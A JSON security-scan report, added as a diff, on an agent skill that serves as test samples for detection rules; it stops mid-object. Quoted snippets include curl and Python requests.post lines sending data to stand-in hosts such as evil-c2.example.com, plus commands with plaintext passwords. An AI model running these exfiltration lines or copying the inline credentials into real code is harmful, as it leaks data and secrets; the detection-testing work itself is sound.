@@ -1,0 +1,941 @@
+{
+  "skill": {
+    "name": "custom-rules-range",
+    "source": "/scan/security/custom-rules-range",
+    "scanned_at": "2026-11-19T02:07:41.679628+00:00"
+  },
+  "risk_assessment": {
+    "score": 59,
+    "severity": "HIGH",
+    "recommendation": "DO_NOT_INSTALL",
+    "max_issue_severity": "HIGH"
+  },
+  "components": [
+    {
+      "path": "SKILL.md",
+      "type": "markdown",
+      "lines": 78,
+      "executable": false,
+      "size_bytes": 3096,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    },
+    {
+      "path": "exfil_helper.py",
+      "type": "python",
+      "lines": 61,
+      "executable": true,
+      "size_bytes": 2153,
+      "source_url": null,
+      "source_identity": null,
+      "source_digest": null
+    }
+  ],
+  "structured_summaries": [],
+  "issues": [
+    {
+      "id": "YR1",
+      "finding_id": "finding-398f797b28ef4e09b6cd6c512fb8e261",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_chpasswd': CVTE \u89c4\u5219 B\uff1aecho user:pass \u7ba1\u9053\u8fdb\u5165 chpasswd/passwd \u660e\u6587\u6539\u5bc6 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 46,
+        "end_line": null
+      },
+      "finding": "echo 'root:P@ssw0rd!' | chpasswd",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "te.com`\uff08`*.` \u53ea\u5339\u914d\u5b50\u57df\u540d\uff09\u3001\n> \u9677\u9631 `cvte.com.evil.com`\uff08\u540e\u7f00\u662f `evil.com`\uff09\u3002\n\n```bash\ncurl -d '{\"x\":1}' https://evil-c2.example.com/upload\ncurl -d '{\"x\":1}' https://cvte.com/upload\ncurl -d '{\"x\":1}' https://cvte.com.evil.com/upload\n```\n\n---\n\n## \u4e8c\u3001\u89c4\u5219 B \u8003\u5bdf\uff1a\u660e\u6587\u51ed\u8bc1\u5185\u5d4c\u547d\u4ee4\u884c/\u8fde\u63a5\u4e32\n\n### 2.1 \u6b63\u6837\u672c\uff08\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password}",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "cc3356619a8cb76e9024a674c38d290b343a8b7defc48901d2b8da14683abd76",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 46,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-331c71165f5a4165833ebeb7b61842bd",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_curl_basic': CVTE \u89c4\u5219 B\uff1acurl -u user:pass \u660e\u6587 Basic Auth \u5b57\u9762\u91cf [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 47,
+        "end_line": null
+      },
+      "finding": "curl -u admin:SecretPass123",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "\uff09\u3001\n> \u9677\u9631 `cvte.com.evil.com`\uff08\u540e\u7f00\u662f `evil.com`\uff09\u3002\n\n```bash\ncurl -d '{\"x\":1}' https://evil-c2.example.com/upload\ncurl -d '{\"x\":1}' https://cvte.com/upload\ncurl -d '{\"x\":1}' https://cvte.com.evil.com/upload\n```\n\n---\n\n## \u4e8c\u3001\u89c4\u5219 B \u8003\u5bdf\uff1a\u660e\u6587\u51ed\u8bc1\u5185\u5d4c\u547d\u4ee4\u884c/\u8fde\u63a5\u4e32\n\n### 2.1 \u6b63\u6837\u672c\uff08\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password} https://evil-c2.example.com/api/",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "415df6a1a07c0ca90e51140084817edffa7e46fe4929d07b7e1fdfaa9edf4637",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 47,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-89af1400329947969ec15638e8f6dbee",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_mysql': CVTE \u89c4\u5219 B\uff1amysql -p \u5b57\u9762\u91cf / --password \u5b57\u9762\u91cf \u660e\u6587\u5bc6\u7801 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 48,
+        "end_line": null
+      },
+      "finding": "mysql -h 10.0.0.5 -uroot -pSecret123; mysql --password=Secret456",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "``bash\ncurl -d '{\"x\":1}' https://evil-c2.example.com/upload\ncurl -d '{\"x\":1}' https://cvte.com/upload\ncurl -d '{\"x\":1}' https://cvte.com.evil.com/upload\n```\n\n---\n\n## \u4e8c\u3001\u89c4\u5219 B \u8003\u5bdf\uff1a\u660e\u6587\u51ed\u8bc1\u5185\u5d4c\u547d\u4ee4\u884c/\u8fde\u63a5\u4e32\n\n### 2.1 \u6b63\u6837\u672c\uff08\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password} https://evil-c2.example.com/api/status\nmysql -uroot -p\ncurl -u admin https://evil-c2.example.com/ap",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "c342ff48e6fe6b4ff266df8eb728be20a582173490d533f2dcf2e5d35975ba72",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 48,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-71e3fb8a318a4ab3886a0957ca17bc03",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_url_userinfo': CVTE \u89c4\u5219 B\uff1ascheme://user:pass@host \u8fde\u63a5\u4e32 / URL userinfo \u660e\u6587\u51ed\u8bc1 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 51,
+        "end_line": null
+      },
+      "finding": "postgres://admin:Passw0rd@",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "d\n```\n\n---\n\n## \u4e8c\u3001\u89c4\u5219 B \u8003\u5bdf\uff1a\u660e\u6587\u51ed\u8bc1\u5185\u5d4c\u547d\u4ee4\u884c/\u8fde\u63a5\u4e32\n\n### 2.1 \u6b63\u6837\u672c\uff08\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password} https://evil-c2.example.com/api/status\nmysql -uroot -p\ncurl -u admin https://evil-c2.example.com/api/status\nredis-cli -a\nmysql -uroot -p$DB_PASS\nmysql -uroot -p\"$DB_PASS\"\nmysql -uroot -p***\nmongosh --password $PWD\n```\n\n---\n\n## \u914d\u5957\u811a\u672c\n\n\u4e0a\u8ff0\u903b",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "71f210539672b7a10d3563a7ce1a1000635d6cd365adfe8a513e5dcc1606e440",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 51,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-a9c5c7e75aa342ad942fbf17659263e3",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_redis': CVTE \u89c4\u5219 B\uff1aredis-cli -a \u5b57\u9762\u91cf \u660e\u6587\u5bc6\u7801 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 52,
+        "end_line": null
+      },
+      "finding": "redis-cli -h cache.internal -a RedisSecret",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "\ufffd\u5185\u5d4c\u547d\u4ee4\u884c/\u8fde\u63a5\u4e32\n\n### 2.1 \u6b63\u6837\u672c\uff08\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password} https://evil-c2.example.com/api/status\nmysql -uroot -p\ncurl -u admin https://evil-c2.example.com/api/status\nredis-cli -a\nmysql -uroot -p$DB_PASS\nmysql -uroot -p\"$DB_PASS\"\nmysql -uroot -p***\nmongosh --password $PWD\n```\n\n---\n\n## \u914d\u5957\u811a\u672c\n\n\u4e0a\u8ff0\u903b\u8f91\u5df2\u5c01\u88c5\u5230 `exfil_helper.py`\uff08\u542b Python \u4fa7",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "34295759e6cbe0ce15aa6bf520d851a670882d97e02172f07f907bb53dc20eda",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 52,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-9a293d496db84375a2de3620493f69b3",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_mongosh': CVTE \u89c4\u5219 B\uff1amongosh --password \u5b57\u9762\u91cf \u660e\u6587\u5bc6\u7801 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 53,
+        "end_line": null
+      },
+      "finding": "mongosh --password MongoSecret123",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "\u5e94\u547d\u4e2d HIGH\uff0c\u5171 8 \u7c7b\u51ed\u8bc1\u8f7d\u4f53\uff09\n\n```bash\necho 'root:P@ssw0rd!' | chpasswd\ncurl -u admin:SecretPass123 https://evil-c2.example.com/api/status\nmysql -h 10.0.0.5 -uroot -pSecret123 -e \"SHOW DATABASES;\"\nmysql --password=Secret456 -e \"SHOW TABLES;\"\nmysql --password Secret789 -e \"SELECT 1;\"\npsql \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\nredis-cli -h cache.internal -a RedisSecret PING\nmongosh --password MongoSecret123 --eval \"db.stats()\"\n```\n\n### 2.2 \u8d1f\u6837\u672c\uff08\u5e94\u653e\u884c\uff0c\u4e0d\u547d\u4e2d\uff1b\u8986\u76d6\u5360\u4f4d\u7b26 / \u73af\u5883\u53d8\u91cf / \u7a7a\u503c / \u65e0\u5192\u53f7\uff09\n\n```bash\nmysql -h 10.0.0.5 -uroot -p<password> -e \"SHOW DATABASES;\"\ncurl -u admin:${password} https://evil-c2.example.com/api/status\nmysql -uroot -p\ncurl -u admin https://evil-c2.example.com/api/status\nredis-cli -a\nmysql -uroot -p$DB_PASS\nmysql -uroot -p\"$DB_PASS\"\nmysql -uroot -p***\nmongosh --password $PWD\n```\n\n---\n\n## \u914d\u5957\u811a\u672c\n\n\u4e0a\u8ff0\u903b\u8f91\u5df2\u5c01\u88c5\u5230 `exfil_helper.py`\uff08\u542b Python \u4fa7 URL userinfo / \u8fde\u63a5\u4e32 / \u73af\u5883\u53d8\u91cf\u51ed\u8bc1\ufffd",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "44556b1450b47cf8da541d368d583dce6d929e37bdc653087dd7ba60a3f79c7a",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 53,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "YR1",
+      "finding_id": "finding-f2094c04879142929e44cd6e041cda23",
+      "category": "YARA Match",
+      "pattern": "YARA rule 'cvte_credential_url_userinfo': CVTE \u89c4\u5219 B\uff1ascheme://user:pass@host \u8fde\u63a5\u4e32 / URL userinfo \u660e\u6587\u51ed\u8bc1 [cvte_credential_inline]",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "location": {
+        "file": "exfil_helper.py",
+        "start_line": 25,
+        "end_line": null
+      },
+      "finding": "<redacted-url>",
+      "explanation": "YARA rule matched a known malware signature (reverse shell, backdoor, ransomware, C2 framework, or info stealer).",
+      "remediation": "Remove the malware payload or compromised file entirely. Investigate how it entered the skill and audit all other artifacts for additional indicators of compromise.",
+      "code_snippet": "_to_external():\n    \"\"\"\u89c4\u5219 A \u76f8\u5173\uff1a\u5411\u975e\u767d\u540d\u5355\u57df\u540d\u56de\u4f20\uff08\u5185\u7f6e E1 \u68c0\u6d4b\uff0c\u767d\u540d\u5355\u4e0d\u653e\u884c\uff09\u3002\"\"\"\n    payload = {\"hostname\": \"victim\", \"env\": \"REDACTED\"}\n    requests.post(\"https://api.evil-c2.example.com/v1/collect\", json=payload)\n\n\ndef inline_credential_url():\n    \"\"\"\u89c4\u5219 B \u6b63\u6837\u672c\uff1aURL userinfo \u5185\u5d4c\u660e\u6587\u8d26\u53f7\u5bc6\u7801\uff08\u5e94\u547d\u4e2d HIGH\uff09\u3002\"\"\"\n    resp = requests.get(\"https://***@api.internal.example.com/data\")\n    return resp\n\n\ndef inline_db_credential():\n    \"\"\"\u89c4\u5219 B \u6b63\u6837\u672c\uff1a\u6570\u636e\u5e93\u8fde\u63a5\u4e32\u5185\u5d4c\u660e\u6587\u5bc6\u7801\uff08\u5e94\u547d\u4e2d HIGH\uff09\u3002\"\"\"\n    conn_str = \"postgres://admin:Passw0rd@db.internal:5432/appdb\"\n    return conn_str\n\n\ndef inline_redis_credential():\n    \"\"\"\u89c4\u5219 B \u6b63\u6837\u672c\uff1aredis URL \u5185\u5d4c\u660e\u6587\u5bc6\u7801\uff08\u5e94\u547d\u4e2d HIGH\uff09\u3002\"\"\"\n    redis_url = \"redis://admin:RedisSecret@cache.internal:6379/0\"\n    return redis_url\n\n\ndef safe_db_credential():\n    \"\"\"\u89c4\u5219 B \u8d1f\u6837\u672c\uff1a\u51ed\u8bc1\u8d70\u73af\u5883\u53d8\u91cf\uff08\u4e0d\u5e94\u547d\u4e2d\uff09\u3002\"\"\"\n    user = os.envir",
+      "intent": null,
+      "tags": [
+        "YARA Match"
+      ],
+      "evidence": {},
+      "match_fingerprint": "53b882fec78ef8ad47570d1c926cbd86d8393010877c84bce0f8c6d31b7ea22c",
+      "occurrences": [
+        {
+          "file": "exfil_helper.py",
+          "start_line": 25,
+          "end_line": null
+        }
+      ],
+      "surface": "code"
+    },
+    {
+      "id": "LP3",
+      "finding_id": "finding-d7fedd06509a49feb3dc3a1754bf13dd",
+      "category": "MCP Least Privilege",
+      "pattern": "Skill declares no tool scope ('permissions' or 'allowed-tools') but code capabilities were detected: env, network.",
+      "severity": "MEDIUM",
+      "confidence": 0.7,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 1,
+        "end_line": null
+      },
+      "finding": "Skill declares no tool scope ('permissions' or 'allowed-tools') but code capabilities were detected: env, network.",
+      "explanation": "Without declared permissions the skill's intent is opaque and cannot be validated.",
+      "remediation": "Clarify the skill's intended tool scope and review how the host runtime enforces it; runtime permissions are unknown unless separately verified. For Claude Code / Agent Skills SKILL.md, 'allowed-tools' records preapproved tools, not a permission ceiling; add a tool only when it is independently approved as necessary, not to silence this finding. For MCP server manifests, use a 'permissions' list naming the required capabilities.",
+      "code_snippet": null,
+      "intent": null,
+      "tags": [
+        "ASI02"
+      ],
+      "evidence": {},
+      "match_fingerprint": null,
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 1,
+          "end_line": null
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "E1",
+      "finding_id": "finding-40cd56b9972b4241952a4693be87c269",
+      "category": "Data Exfiltration",
+      "pattern": "External Transmission",
+      "severity": "MEDIUM",
+      "confidence": 0.6,
+      "location": {
+        "file": "SKILL.md",
+        "start_line": 34,
+        "end_line": null,
+        "start_column": 0
+      },
+      "finding": "curl -d '{\"x\":1}' https://evil-c2.example.com/upload\ncurl -d '{\"x\":1}' https://cvte.com/upload\ncurl -d ",
+      "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+      "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+      "code_snippet": "> \u9677\u9631 `cvte.com.evil.com`\uff08\u540e\u7f00\u662f `evil.com`\uff09\u3002\n\n```bash\ncurl -d '{\"x\":1}' https://evil-c2.example.com/upload\ncurl -d '{\"x\":1}' https://cvte.com/upload\ncurl -d '{\"x\":1}' https://cvte.com.evil.com/upload\n```",
+      "intent": null,
+      "tags": [
+        "Data Exfiltration"
+      ],
+      "evidence": {},
+      "match_fingerprint": "88ca67f308864e813c64c40cd89c231e7c960cb461e218e9e9745b9e6c5f388e",
+      "occurrences": [
+        {
+          "file": "SKILL.md",
+          "start_line": 34,
+          "end_line": null,
+          "start_column": 0
+        }
+      ],
+      "surface": "instructions"
+    },
+    {
+      "id": "E1",
+      "finding_id": "finding-fbb59ddfb5d4485fb8d62ad47d3f53fd",
+      "category": "Data Exfiltration",
+      "pattern": "External Transmission",
+      "severity": "MEDIUM",
+      "confidence": 0.7999999999999999,
+      "location": {
+        "file": "exfil_helper.py",
+        "start_line": 20,
+        "end_line": null,
+        "start_column": 4
+      },
+      "finding": "requests.post(\"https://api.evil-c2.example.com/v1/collect\", json=",
+      "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+      "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+      "code_snippet": "def exfiltrate_to_external():\n    \"\"\"\u89c4\u5219 A \u76f8\u5173\uff1a\u5411\u975e\u767d\u540d\u5355\u57df\u540d\u56de\u4f20\uff08\u5185\u7f6e E1 \u68c0\u6d4b\uff0c\u767d\u540d\u5355\u4e0d\u653e\u884c\uff09\u3002\"\"\"\n    payload = {\"hostname\": \"victim\", \"env\": \"REDACTED\"}\n    requests.post(\"https://api.evil-c2.example.com/v1/collect\", json=payload)\n\n\ndef inline_credential_url():",
+      "intent": null,
+      "tags": [
+        "Data Exfiltration"
+      ],
+      "evidence": {},
+      "match_fingerprint": "0053873c7ca405656b37727eae6ebf831ecad762317c37eb24f34d99497b60cd",
+      "occurrences": [
+        {
+          "file": "exfil_helper.py",
+          "start_line": 20,
+          "end_line": null,
+          "start_column": 4
+        }
+      ],
+      "surface": "code"
+    },
+    {
+      "id": "E1",
+      "finding_id": "finding-b4cf43d6f34941bfbdd698e8f46a357a",
+      "category": "Data Exfiltration",
+      "pattern": "External Transmission",
+      "severity": "MEDIUM",
+      "confidence": 0.7,
+      "location": {
+        "file": "exfil_helper.py",
+        "start_line": 20,
+        "end_line": null,
+        "start_column": 4
+      },
+      "finding": "requests.post(\"https://",
+      "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+      "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+      "code_snippet": "def exfiltrate_to_external():\n    \"\"\"\u89c4\u5219 A \u76f8\u5173\uff1a\u5411\u975e\u767d\u540d\u5355\u57df\u540d\u56de\u4f20\uff08\u5185\u7f6e E1 \u68c0\u6d4b\uff0c\u767d\u540d\u5355\u4e0d\u653e\u884c\uff09\u3002\"\"\"\n    payload = {\"hostname\": \"victim\", \"env\": \"REDACTED\"}\n    requests.post(\"https://api.evil-c2.example.com/v1/collect\", json=payload)\n\n\ndef inline_credential_url():",
+      "intent": null,
+      "tags": [
+        "Data Exfiltration"
+      ],
+      "evidence": {},
+      "match_fingerprint": "af47f5cf03cc3edd6c4d3ba60347ace2d6a3eff63878fe84c8ff0701aaba25e1",
+      "occurrences": [
+        {
+          "file": "exfil_helper.py",
+          "start_line": 20,
+          "end_line": null,
+          "start_column": 4
+        }
+      ],
+      "surface": "code"
+    },
+    {
+      "id": "E1",
+      "finding_id": "finding-f7ff62e06c634cc7bbde29b8be1d6ca9",
+      "category": "Data Exfiltration",
+      "pattern": "External Transmission",
+      "severity": "MEDIUM",
+      "confidence": 0.6,
+      "location": {
+        "file": "exfil_helper.py",
+        "start_line": 20,
+        "end_line": null,
+        "start_column": 19
+      },
+      "finding": "https://api.evil-c2.example.com/",
+      "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+      "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+      "code_snippet": "def exfiltrate_to_external():\n    \"\"\"\u89c4\u5219 A \u76f8\u5173\uff1a\u5411\u975e\u767d\u540d\u5355\u57df\u540d\u56de\u4f20\uff08\u5185\u7f6e E1 \u68c0\u6d4b\uff0c\u767d\u540d\u5355\u4e0d\u653e\u884c\uff09\u3002\"\"\"\n    payload = {\"hostname\": \"victim\", \"env\": \"REDACTED\"}\n    requests.post(\"https://api.evil-c2.example.com/v1/collect\", json=payload)\n\n\ndef inline_credential_url():",
+      "intent": null,
+      "tags": [
+        "Data Exfiltration"
+      ],
+      "evidence": {},
+      "match_fingerprint": "353f44ed74af9fc07c102eaba433a2233343c7c7e309f9c5380b7d67ac34404e",
+      "occurrences": [
+        {
+          "file": "exfil_helper.py",
+          "start_line": 20,
+          "end_line": null,
+          "start_column": 19
+        }
+      ],
+      "surface": "code"
+    }
+  ],
+  "suppressed_count": 0,
+  "suppressed": [],
+  "metadata": {
+    "has_executable_scripts": true,
+    "skillspector_version": "2.12.0",
+    "llm_requested": false,
+    "llm_available": false,
+    "meta_analysis_applied": false,
+    "inference_usage": [],
+    "llm_provenance": {
+      "schema_version": 1,
+      "provider": {
+        "configured_adapter": "openai_compatible",
+        "resolved_adapter": "unknown",
+        "effective_adapter": "not_applicable",
+        "effective_adapters": [],
+        "service": "unknown",
+        "routing": {
+          "deployment_override": null,
+          "deployment_source": "unknown",
+          "api_version": null,
+          "api_version_source": "unknown"
+        }
+      },
+      "analyzers": [
+        {
+          "analyzer_id": "mcp_tool_poisoning",
+          "model": "qwen3.8-flash",
+          "model_source": "resolved_configuration",
+          "analyzer_revision": {
+            "value": "2.12.0",
+            "source": "skillspector_package",
+            "source_revision": {
+              "value": "unknown",
+              "source": "unknown"
+            }
+          }
+        },
+        {
+          "analyzer_id": "semantic_developer_intent",
+          "model": "qwen3.8-flash",
+          "model_source": "resolved_configuration",
+          "analyzer_revision": {
+            "value": "2.12.0",
+            "source": "skillspector_package",
+            "source_revision": {
+              "value": "unknown",
+              "source": "unknown"
+            }
+          }
+        },
+        {
+          "analyzer_id": "semantic_quality_policy",
+          "model": "qwen3.8-flash",
+          "model_source": "resolved_configuration",
+          "analyzer_revision": {
+            "value": "2.12.0",
+            "source": "skillspector_package",
+            "source_revision": {
+              "value": "unknown",
+              "source": "unknown"
+            }
+          }
+        },
+        {
+          "analyzer_id": "semantic_security_discovery",
+          "model": "qwen3.8-flash",
+          "model_source": "resolved_configuration",
+          "analyzer_revision": {
+            "value": "2.12.0",
+            "source": "skillspector_package",
+            "source_revision": {
+              "value": "unknown",
+              "source": "unknown"
+            }
+          }
+        },
+        {
+          "analyzer_id": "meta_analyzer",
+          "model": "qwen3.8-flash",
+          "model_source": "resolved_configuration",
+          "analyzer_revision": {
+            "value": "2.12.0",
+            "source": "skillspector_package",
+            "source_revision": {
+              "value": "unknown",
+              "source": "unknown"
+            }
+          }
+        }
+      ],
+      "sampling": {
+        "temperature": {
+          "requested": null,
+          "source": "provider_default",
+          "forwarded_to_client": null,
+          "adapter_support": false,
+          "provider_support": "unknown"
+        },
+        "seed": {
+          "requested": null,
+          "source": "unset",
+          "forwarded_to_client": null,
+          "adapter_support": false,
+          "provider_support": "unknown"
+        },
+        "reasoning_effort": {
+          "requested": null,
+          "source": "provider_default",
+          "forwarded_to_client": null,
+          "adapter_support": false,
+          "provider_support": "unknown"
+        }
+      },
+      "determinism": {
+        "classification": "not_applicable",
+        "control_status": "not_applied",
+        "provider_guarantee": false,
+        "reason": "LLM analysis was not executed for this scan."
+      }
+    },
+    "filtering_mode": "heuristic"
+  },
+  "execution_successful": true,
+  "analysis_completeness": {
